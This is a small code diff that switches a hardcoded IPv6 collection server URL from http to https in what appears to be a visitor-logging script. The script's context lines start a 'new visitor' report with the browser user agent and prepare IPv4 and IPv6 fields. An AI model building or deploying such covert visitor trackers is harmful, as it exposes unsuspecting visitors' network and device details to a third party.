@@ -1,4 +1,4 @@
-const serverurl = "http://[2800:370:c9:bb60:ddfb:cdd6:db8b:51cd]:3000/"
+const serverurl = "https://[2800:370:c9:bb60:ddfb:cdd6:db8b:51cd]:3000/"
 let logM="You have a new visitor, the credentials are"+"<br><br>"+navigator.userAgent+"<br><br>";
 let ipv4="";
 let ipv6="";
